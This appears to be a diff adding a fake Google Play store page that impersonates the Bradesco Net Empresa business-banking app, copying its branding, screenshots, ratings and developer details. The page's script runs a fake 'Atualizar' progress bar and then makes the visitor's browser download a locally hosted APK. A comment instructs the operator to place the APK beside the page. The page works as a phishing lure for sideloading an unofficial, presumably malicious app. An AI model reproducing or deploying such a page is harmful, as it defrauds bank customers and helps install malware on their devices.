@@ -1,1 +1,261 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Bradesco Net Empresa: Conta PJ – Apps no Google Play</title>
+<link rel="shortcut icon" href="./img/logplay.png" type="image/x-icon">
+<style>
+*{margin:0;padding:0;box-sizing:border-box;}
+:root{--green:#01875f;--text:#202124;--muted:#5f6368;--border:#dadce0;--hover:#f1f3f4;}
+body{font-family:"Google Sans","Roboto","Helvetica Neue",Arial,sans-serif;background:#fff;color:var(--text);}
+a{color:inherit;text-decoration:none;cursor:default;}
+button{font-family:inherit;cursor:default;border:none;background:none;}
+.icn{vertical-align:-4px;}
+.logicon{width: 10%;}
+/* ===== topo ===== */
+header.top{display:flex;align-items:center;gap:4px;padding:4px 16px;height:56px;position:sticky;top:0;background:#fff;z-index:40;}
+.iconbtn{width:40px;height:40px;border-radius:50%;display:flex;align-items:center;justify-content:center;}
+.iconbtn svg{width:22px;height:22px;fill:#5f6368;}
+.logo{display:flex;align-items:center;gap:7px;margin-right:10px;user-select:none;padding:0 8px;}
+.logo span{font-size:20px;font-weight:500;letter-spacing:-.3px;}
+.search{flex:1;max-width:640px;display:flex;align-items:center;background:#f8f9fa;border-radius:24px;height:42px;padding:0 14px;}
+.search input{flex:1;border:none;outline:none;background:transparent;font-size:14px;margin-left:8px;}
+.search svg{width:18px;height:18px;fill:#5f6368;}
+.avatar{margin-left:auto;width:32px;height:32px;border-radius:50%;background:linear-gradient(135deg,#1a73e8,#8ab4f8);color:#fff;display:flex;align-items:center;justify-content:center;font-size:14px;}
+.tabrow{display:flex;gap:8px;justify-content:center;border-bottom:1px solid var(--border);padding-bottom:10px;font-size:15px;color:var(--muted);}
+.tabrow span{padding:6px 16px;border-radius:16px;}
+.tabrow .on{background:#d2e3fc;color:#1967d2;font-weight:500;}
+
+/* ===== cabeçalho do app ===== */
+main{max-width:1000px;margin:0 auto;padding:26px 24px 60px;}
+.apphead{display:flex;gap:26px;flex-wrap:wrap;}
+.appicon{width:142px;height:142px;border-radius:26px;object-fit:cover;flex-shrink:0;box-shadow:0 1px 3px rgba(60,64,67,.25);}
+.info{flex:1;min-width:280px;}
+.appname{font-size:30px;font-weight:500;letter-spacing:-.4px;line-height:1.2;}
+.dev{color:var(--green);font-weight:500;font-size:15px;margin-top:3px;}
+.stats{display:flex;align-items:center;margin:18px 0 8px;border-top:1px solid var(--border);border-bottom:1px solid var(--border);padding:12px 0;}
+.stat{flex:1;display:flex;flex-direction:column;align-items:center;gap:2px;padding:0 12px;position:relative;}
+.stat + .stat::before{content:"";position:absolute;left:0;top:6px;bottom:6px;width:1px;background:var(--border);}
+.stat b{font-size:14px;font-weight:500;}
+.stat i{font-style:normal;font-size:12px;color:var(--muted);}
+.stars{position:relative;font-size:15px;line-height:1;height:18px;}
+.stars .b{color:#dadce0;}
+.stars .f{position:absolute;left:0;top:0;overflow:hidden;white-space:nowrap;color:#fbbc04;width:88%;}
+.pegi{display:inline-flex;align-items:center;gap:2px;border:1px solid #a9adae;border-radius:4px;padding:3px 6px;font-size:11px;font-weight:700;color:#3c4043;}
+
+.btns2{display:flex;gap:10px;margin:14px 0 12px;flex-wrap:wrap;}
+.btn2{height:44px;border-radius:22px;font-size:14px;font-weight:500;color:var(--green);display:inline-flex;align-items:center;justify-content:center;gap:8px;padding:0 20px;}
+.btn-install{width:100%;height:50px;border-radius:25px;background:var(--green);color:#fff;font-size:16px;font-weight:500;position:relative;overflow:hidden;margin-bottom:24px;}
+.btn-install .prog{position:absolute;inset:0;width:0%;background:#016b4d;transition:width .2s linear;}
+.btn-install span{position:relative;z-index:1;}
+
+/* ===== mídia ===== */
+.media{margin:26px 0;}
+.strip{display:flex;gap:14px;overflow-x:auto;padding-bottom:6px;scrollbar-width:thin;}
+.shot{width:225px;height:400px;border-radius:14px;object-fit:cover;box-shadow:0 1px 3px rgba(60,64,67,.25);background:#eef1f2;flex-shrink:0;}
+.trailer{min-width:300px;height:168px;border-radius:12px;flex-shrink:0;position:relative;overflow:hidden;background:linear-gradient(150deg,#0a3a7c,#1c6dd0 60%,#4d94e8);display:flex;flex-direction:column;align-items:center;justify-content:center;gap:10px;box-shadow:0 1px 3px rgba(60,64,67,.25);}
+.trailer svg{width:52px;height:52px;fill:rgba(255,255,255,.95);filter:drop-shadow(0 2px 6px rgba(0,0,0,.35));}
+.trailer span{color:#fff;font-size:14px;font-weight:500;}
+.dots{display:flex;gap:8px;margin-top:10px;}
+.dots i{width:8px;height:8px;border-radius:50%;background:#dadce0;font-style:normal;}
+.dots i.on{background:var(--text);}
+
+/* ===== seções ===== */
+section.blk{margin:30px 0;}
+.blk > .hd{display:flex;align-items:center;justify-content:space-between;margin-bottom:14px;}
+.blk h2{font-size:22px;font-weight:500;}
+.arrow{width:36px;height:36px;border-radius:50%;display:flex;align-items:center;justify-content:center;}
+.arrow svg{width:20px;height:20px;fill:#5f6368;}
+#about p{font-size:14px;line-height:1.65;color:#3c4043;white-space:pre-wrap;max-width:860px;}
+.datarow{display:flex;gap:24px;flex-wrap:wrap;padding:16px 0;border-top:1px solid var(--border);border-bottom:1px solid var(--border);}
+.datacell{display:flex;flex-direction:column;gap:2px;min-width:90px;}
+.datacell svg{width:26px;height:26px;fill:#5f6368;margin-bottom:4px;}
+.datacell b{font-size:15px;font-weight:500;}
+.datacell i{font-style:normal;font-size:11px;color:var(--muted);}
+.safety ul{list-style:none;}
+.safety li{display:flex;align-items:flex-start;gap:16px;margin:18px 0;max-width:680px;}
+.safety svg{width:24px;height:24px;fill:#5f6368;flex-shrink:0;margin-top:2px;}
+.safety b{font-size:14px;font-weight:500;display:block;}
+.safety .sub{font-size:13px;color:#5f6368;}
+.suprow{display:flex;gap:12px;align-items:baseline;padding:10px 0;border-top:1px solid var(--border);font-size:14px;}
+.suprow svg{width:18px;height:18px;fill:#5f6368;flex-shrink:0;}
+.suprow .k{color:var(--muted);min-width:170px;}
+.devt td{padding:8px 14px;font-size:14px;vertical-align:top;line-height:1.5;}
+.devt td.k{color:var(--muted);width:180px;white-space:nowrap;}
+footer{border-top:1px solid var(--border);margin-top:50px;padding:22px;text-align:center;font-size:12px;color:var(--muted);}
+@media(max-width:600px){
+  .apphead{flex-direction:column;align-items:flex-start;}
+  .appname{font-size:25px;}
+  main{padding:18px 16px 40px;}
+  .shot{width:170px;height:302px;}
+}
+</style>
+</head>
+<body>
+
+<header class="top">
+  <span class="iconbtn"><svg viewBox="0 0 24 24"><path d="M3 6h18v2H3V6zm0 5h18v2H3v-2zm0 5h18v2H3v-2z"/></svg></span>
+  <span class="logo">
+    <img class="logicon" alt="Imagem do ícone" src="./img/logplay.png">
+    <span style="color: gray;">Google Play</span>
+  </span>
+  <!-- <span class="search">
+    <svg viewBox="0 0 24 24"><path d="M15.5 14h-.79l-.28-.27A6.47 6.47 0 0 0 16 9.5 6.5 6.5 0 1 0 9.5 16c1.61 0 3.09-.59 4.23-1.57l.27.28v.79l5 4.99L20.49 19l-4.99-5zm-6 0C7 14 5 12 5 9.5S7 5 9.5 5 14 7 14 9.5 12 14 9.5 14z"/></svg>
+    <input type="text" placeholder="Pesquisar aplicativos e jogos">
+  </span> -->
+  <span class="iconbtn"><svg viewBox="0 0 25 25"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 17h-2v-2h2v2zm2.07-7.75-.9.92C13.45 12.9 13 13.5 13 15h-2v-.5c0-1.1.45-2.1 1.17-2.83l1.24-1.26c.37-.36.59-.86.59-1.41 0-1.1-.9-2-2-2s-2 .9-2 2H8a4 4 0 1 1 8 0c0 .88-.36 1.68-.93 2.25z"/></svg></span>
+  <!-- <span class="avatar">U</span> -->
+</header>
+<nav class="tabrow"><span>Jogos</span><span class="on">Apps</span><span>Livros</span><span>Crianças</span></nav>
+
+<main>
+  <!-- cabeçalho -->
+  <div class="apphead">
+    <img class="appicon" alt="Imagem do ícone" src="https://play-lh.googleusercontent.com/IIMGu6i-BAUi8_guyBiz1Sa_ZFnejo8tMk8Nv1U8POMh8N0yHzpdxfOmetTfuO7ytkkW43ETtL0XZM_loRIN=s512">
+    <div class="info">
+      <h1 class="appname">Bradesco Net Empresa: Conta PJ</h1>
+      <div class="dev">Banco Bradesco SA</div>
+      <div class="stats">
+        <div class="stat">
+          <span class="stars"><span class="b">★★★★★</span><span class="f">★★★★★</span></span>
+          <i>4,4</i>
+        </div>
+        <div class="stat"><b>5 mi+</b><i>downloads</i></div>
+        <div class="stat"><span class="pegi">PEGI 3</span><i>3 anos</i></div>
+      </div>
+      <div class="btns2">
+        <span class="btn2"><svg class="icn" width="19" height="19" viewBox="0 0 24 24" fill="currentColor"><path d="M18 16.08c-.76 0-1.44.3-1.96.77L8.91 12.7c.05-.23.09-.46.09-.7s-.04-.47-.09-.7l7.05-4.11c.54.5 1.25.81 2.04.81 1.66 0 3-1.34 3-3s-1.34-3-3-3-3 1.34-3 3c0 .24.04.47.09.7L8.04 9.81C7.5 9.31 6.79 9 6 9c-1.66 0-3 1.34-3 3s1.34 3 3 3c.79 0 1.5-.31 2.04-.81l7.12 4.16c-.05.21-.08.43-.08.65 0 1.61 1.31 2.92 2.92 2.92s2.92-1.31 2.92-2.92-1.31-2.92-2.92-2.92z"/></svg>Compartilhar</span>
+        <span class="btn2"><svg class="icn" width="19" height="19" viewBox="0 0 24 24" fill="currentColor"><path d="M17 3H7c-1.1 0-2 .9-2 2v16l7-3 7 3V5c0-1.1-.9-2-2-2z"/></svg>Adicionar à lista de desejos</span>
+      </div>
+      <button class="btn-install" id="installBtn" onclick="doInstall()"><div class="prog" id="prog"></div><span id="installLbl">Atualizar</span></button>
+    </div>
+  </div>
+
+  <!-- trailer + capturas -->
+  <div class="media">
+    <div class="strip" id="strip"></div>
+    <div class="dots" id="dots"></div>
+  </div>
+
+  <!-- sobre -->
+  <section class="blk">
+    <div class="hd"><h2>Sobre este app</h2><span class="arrow"><svg viewBox="0 0 24 24"><path d="M12 4l-1.41 1.41L16.17 11H4v2h12.17l-5.58 5.59L12 20l8-8z"/></svg></span></div>
+    <p id="about">O aplicativo Bradesco Net Empresa é a conta PJ ideal para gestão financeira empresarial, desenvolvido para empresas que buscam praticidade, segurança e autonomia no dia a dia. Com ele, você realiza a gestão completa em tempo real da sua empresa, acompanha movimentações financeiras e contrata crédito, capital de giro e soluções financeiras diretamente pelo aplicativo, com agilidade e controle total.
+Aqui você encontra uma série de serviços e funcionalidades pensadas para facilitar a gestão da sua conta PJ, melhorar o fluxo de caixa e otimizar a rotina financeira do seu negócio, a qualquer hora e de onde estiver, com acesso digital, rápido e seguro.
+Com o app Bradesco Net Empresa, sua empresa conta com recursos completos de banco digital PJ e soluções financeiras integradas:
+• Pague contas, boletos e tributos: utilize leitura de código de barras, agende pagamentos, consulte saldos, extratos e altere limites diretamente pelo app
+• Receba de forma simples via boleto: ofereça opções de pagamento à vista ou parcelado, facilite a gestão de cobranças e controle recebíveis com eficiência
+• Controle o Pix da sua empresa: gerencie suas chaves Pix PJ, receba pagamentos instantâneos, utilize QR Code, Pix Copia e Cola e integre com maquininhas de cartão
+• Proteja suas transações financeiras: valide operações com chaves de segurança, autenticação e múltiplas camadas de proteção para sua conta PJ
+• Dinheiro na hora para sua empresa: impulsione o crescimento do seu negócio com soluções personalizadas de capital de giro e crédito empresarial
+• Contrate crédito quando precisar: tenha acesso a linhas de crédito PJ, antecipação de recebíveis, financiamento e soluções para fluxo de caixa
+• Receba pagamentos por aproximação pelo celular: modernize sua operação com soluções digitais com mais praticidade e rapidez
+• Acesse soluções para gestão empresarial: visualize relatórios financeiros, organize suas finanças e tome decisões mais estratégicas
+Com o App Bradesco Net Empresa você organiza suas finanças e toma decisões mais estratégicas para sua conta PJ. Veja tudo em um só lugar, direto no aplicativo Bradesco Net Empresa, o banco digital da conta PJ. Acompanhe saldos, extratos detalhados, lançamentos futuros e movimentações financeiras da sua empresa de forma simples, rápida e organizada.
+Conecte as contas da sua empresa por meio do Open Finance, integre diferentes instituições financeiras e receba ofertas personalizadas de produtos e serviços, como crédito PJ, capital de giro, antecipação e soluções financeiras sob medida.
+Tenha uma conta PJ completa, com funcionalidades de banco digital, gestão financeira empresarial, pagamentos, recebimentos, Pix e crédito para empresas — tudo em um único aplicativo.
+O Bradesco Net Empresa é a solução completa de banco digital para empresas que precisam de agilidade na gestão financeira. Com funcionalidades de conta PJ online, gestão de fluxo de caixa, pagamentos empresariais, recebimento via Pix e boleto, crédito PJ e serviços bancários digitais, o app reúne tudo o que sua empresa precisa em um só lugar.
+Banco Bradesco SA | CNPJ: 60.746.948/0001 12
+Cidade de Deus, S/Nº – Vila Yara – Osasco/SP – CEP 06029 900
+Desenvolvedor: Banco Bradesco SA
+Segurança e proteção contra fraudes
+Para reforçar a segurança dos nossos clientes, o app pode utilizar informações relacionadas ao estado de chamadas telefônicas, com o objetivo de identificar possíveis tentativas de fraude.
+Esse uso é restrito às funcionalidades de segurança do aplicativo, sem coleta, armazenamento ou compartilhamento de dados pessoais.</p>
+  </section>
+
+  <!-- segurança dos dados -->
+  <section class="blk safety">
+    <div class="hd"><h2>Segurança dos dados</h2><span class="arrow"><svg viewBox="0 0 24 24"><path d="M12 4l-1.41 1.41L16.17 11H4v2h12.17l-5.58 5.59L12 20l8-8z"/></svg></span></div>
+    <p style="font-size:14px;color:#3c4043;max-width:680px;line-height:1.6;">Sua segurança começa quando você entende como os desenvolvedores coletam e compartilham seus dados. As práticas de segurança e privacidade de dados podem variar de acordo com o uso, a região e a idade. O desenvolvedor forneceu as informações a seguir, que podem ser atualizadas ao longo do tempo.</p>
+    <ul>
+      <li><svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/></svg><div><b>Este app pode compartilhar estes tipos de dados com terceiros</b><span class="sub">Fotos e vídeos e Informações e desempenho do app</span></div></li>
+      <li><svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/></svg><div><b>Este app pode coletar estes tipos de dados</b><span class="sub">Local, Informações financeiras e mais 3</span></div></li>
+      <li><svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/></svg><div><b>Os dados são criptografados em trânsito</b></div></li>
+      <li><svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/></svg><div><b>Você pode solicitar a exclusão dos dados</b></div></li>
+    </ul>
+  </section>
+
+  <!-- linha de dados -->
+  <div class="datarow">
+    <div class="datacell"><svg viewBox="0 0 24 24"><path d="M19.35 10.04A7.49 7.49 0 0 0 12 4C9.11 4 6.6 5.64 5.35 8.04A5.994 5.994 0 0 0 0 14c0 3.31 2.69 6 6 6h13c2.76 0 5-2.24 5-5 0-2.64-2.05-4.78-4.65-4.96zM10 17l-3.5-3.5 1.41-1.41L10 14.17l4.59-4.58L16 11l-6 6z"/></svg><b>15 de set. de 2026</b><i>Atualizado em</i></div>
+    <div class="datacell"><svg viewBox="0 0 24 24"><path d="M12 1 3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm-2 16-4-4 1.41-1.41L10 14.17l6.59-6.59L18 9l-8 8z"/></svg><b>Finanças</b><i>Categoria</i></div>
+    <div class="datacell"><span class="pegi" style="margin-bottom:8px;">PEGI 3</span><b>3 anos</b><i>Classificação de conteúdo</i></div>
+    <div class="datacell"><svg viewBox="0 0 24 24"><path d="M12 1 3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm-2 16-4-4 1.41-1.41L10 14.17l6.59-6.59L18 9l-8 8z"/></svg><b>Segurança dos dados</b><i>Ver mais detalhes</i></div>
+  </div>
+
+  <!-- suporte -->
+  <section class="blk">
+    <div class="hd"><h2>Suporte do app</h2></div>
+    <div class="suprow"><svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-1 17.93c-3.95-.49-7-3.85-7-7.93 0-.62.08-1.21.21-1.79L9 15v1c0 1.1.9 2 2 2v1.93zm6.9-2.54c-.26-.81-1-1.39-1.9-1.39h-1v-3c0-.55-.45-1-1-1H8v-2h2c.55 0 1-.45 1-1V7h2c1.1 0 2-.9 2-2v-.41c2.93 1.19 5 4.06 5 7.41 0 2.08-.8 3.97-2.1 5.39z"/></svg><span class="k">Site</span><span>www.bradesco.com.br</span></div>
+    <div class="suprow"><svg viewBox="0 0 24 24"><path d="M20 4H4c-1.1 0-2 .9-2 2v12c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2zm0 4-8 5-8-5V6l8 5 8-5v2z"/></svg><span class="k">E-mail para suporte</span><span>apoioaempresa@bradesco.com.br</span></div>
+    <div class="suprow"><svg viewBox="0 0 24 24"><path d="M12 1 3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4z"/></svg><span class="k">Política de privacidade</span><span>bradesco.com.br/privacidade</span></div>
+  </section>
+
+  <!-- desenvolvedor -->
+  <section class="blk">
+    <div class="hd"><h2>Sobre o desenvolvedor</h2></div>
+    <table class="devt">
+      <tr><td class="k">Nome</td><td>BANCO BRADESCO SA</td></tr>
+      <tr><td class="k">E-mail</td><td>aplicativos@bradesco.com.br</td></tr>
+      <tr><td class="k">Endereço</td><td>Av. PRESIDENTE JUSCELINO KUBITSCHEK 1309<br>ANDAR 12<br>VILA NOVA CONCEICAO<br>SÃO PAULO - SP<br>04543-011<br>Brazil</td></tr>
+      <tr><td class="k">Telefone</td><td>+55 11 4002-0022</td></tr>
+    </table>
+  </section>
+
+  <footer>
+    <span>Política de privacidade • Termos de Serviço</span>
+  </footer>
+</main>
+
+<script>
+// ============================================================
+//  EDITE AQUI: nome exato do arquivo .apk que está na MESMA
+//  pasta (raiz) desta página. Ex.: "bradesco-net-empresa.apk"
+// ============================================================
+const NOME_DO_APK = "Net_Empresas_083750_build.apk";
+
+// trailer + capturas de tela reais da página
+// capturas de tela reais, em corte vertical (retrato) como no original
+const shots = [
+ "70rt9juJ86Bu0DyKF9U0egBq9HY5UqEzp1d6jdMDBSB2chQp97eP5nLcywTdFjhXmptkGdWP7b6cE5L7N_h5",
+ "RuhsPow6ph1OPU6aw5aGF0F-ROF3Ip3FA2HUencFolkJ7zHxVnOGQUGqRfSXhZxMMWa6DmWPpuaNs2fqcQPd",
+ "9eZk3BKkx_KbPxn_afVYBQpShMexDc8qpyLJ8PgTbD3GGqOhDeoKFVAwux76V0CxXq_I0GNIGHQEHobcEJbRKg",
+ "pRlQxqGCKKd5zub5GfsAUb5YJ3K8HkyN6dhNgQLgUDqTchAOjfyCtjHg1egr2RVmriKaVjxzQIdGJkM2BDG-",
+ "70bbtuLEIJPWx0c5LizVUTAfKm5w3vRMChyaXU5X6zzmhbGzQwHUkoVKSa2wYFUTSOOe4w9PKqhkYnGr2sTN",
+ "Xf3PQZ4HEdyX7OZ3pEa2ndC-0Ncy_Be8_DpRiVnFwLg_-Tn5IGXBJ-y4wqEXJMzOPjUtzozIN2d7DFpCwDSccw"
+].map(b => "https://play-lh.googleusercontent.com/" + b + "=w360-h640");
+
+const strip = document.getElementById("strip"), dots = document.getElementById("dots");
+shots.forEach((s,i)=>{
+  const im = document.createElement("img"); im.className="shot"; im.src=s;
+  strip.appendChild(im);
+  const d = document.createElement("i"); if(i===0) d.className="on"; dots.appendChild(d);
+});
+strip.addEventListener("scroll", ()=>{
+  const idx = Math.round(strip.scrollLeft / ((strip.scrollWidth)/shots.length));
+  [...dots.children].forEach((d,i)=> d.className = i===Math.min(idx,dots.children.length-1) ? "on":"");
+});
+
+
+function doInstall(){
+  const btn=document.getElementById("installBtn"), lbl=document.getElementById("installLbl"), prog=document.getElementById("prog");
+  btn.disabled=true; lbl.textContent="Atualizando";
+  let p=0;
+  const t=setInterval(()=>{
+    p+=Math.random()*16+5;
+    if(p>=100){ p=100; clearInterval(t); baixar(); }
+    prog.style.width=p+"%";
+  },170);
+}
+function baixar(){
+  const a=document.createElement("a");
+  a.href = NOME_DO_APK;
+  a.download = NOME_DO_APK;
+  document.body.appendChild(a); a.click(); a.remove();
+  setTimeout(()=>location.reload(), 1200);
+}
+</script>
+</body>
+</html>
 
